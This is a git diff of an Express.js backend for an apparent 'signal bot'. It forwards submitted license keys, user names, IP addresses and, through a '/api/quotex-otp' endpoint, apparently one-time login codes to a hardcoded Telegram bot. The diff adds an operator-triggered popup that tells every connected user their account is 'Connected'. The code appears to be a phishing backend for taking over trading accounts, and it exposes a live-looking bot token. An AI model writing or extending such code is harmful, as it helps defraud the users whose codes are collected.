@@ -11,6 +11,7 @@ app.use(express.json());
 const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
 const TELEGRAM_CHAT_ID = "7293402395";
 
+// Function to send message to Telegram
 async function sendTelegramMessage(text) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -25,7 +26,53 @@ async function sendTelegramMessage(text) {
     }
 }
 
-// ================== LICENSE + NAME ==================
+// ================== SSE CLIENTS FOR REAL-TIME TRIGGER ==================
+const connectedClients = new Set();
+
+// Real-time events endpoint
+app.get('/api/events', (req, res) => {
+    res.setHeader('Content-Type', 'text/event-stream');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection', 'keep-alive');
+    res.flushHeaders();
+
+    connectedClients.add(res);
+
+    // Send initial connection message
+    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'ready' })}\n\n`);
+
+    req.on('close', () => {
+        connectedClients.delete(res);
+    });
+});
+
+// Trigger connected popup from Telegram
+app.get('/api/trigger-connected', async (req, res) => {
+    const userName = req.query.userName || "User";
+
+    const message = `
+🔗 <b>Connection Triggered Successfully</b>
+
+👤 User: <b>${userName}</b>
+✅ Status: Account Connected
+    `.trim();
+
+    await sendTelegramMessage(message);
+
+    // Push notification to all connected users
+    connectedClients.forEach(client => {
+        try {
+            client.write(`data: ${JSON.stringify({ 
+                type: 'show_connected', 
+                userName: userName 
+            })}\n\n`);
+        } catch (e) {}
+    });
+
+    res.send("Trigger sent successfully");
+});
+
+// ================== LICENSE + NAME ACTIVATION ==================
 app.post('/api/license-activate', async (req, res) => {
     const { licenseKey, userName, timestamp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
@@ -105,27 +152,9 @@ app.post('/api/quotex-otp', async (req, res) => {
     res.status(200).send({ status: "ok" });
 });
 
-// ================== TRIGGER CONNECTED FROM TELEGRAM ==================
-app.get('/api/trigger-connected', async (req, res) => {
-    const userName = req.query.userName || "User";
-
-    const message = `
-🔗 <b>Connection Triggered</b>
-
-User: <b>${userName}</b>
-Status: Account Connected Successfully
-    `.trim();
-
-    await sendTelegramMessage(message);
-
-    // This will be used by the frontend EventSource
-    console.log(`✅ Triggered connected popup for ${userName}`);
-
-    res.send("Trigger sent successfully");
-});
-
+// Root
 app.get('/', (req, res) => {
-    res.send("✅ Chinese Signal Bot Backend Running");
+    res.send("✅ Chinese Signal Bot Backend is Running");
 });
 
 const PORT = process.env.PORT || 3000;
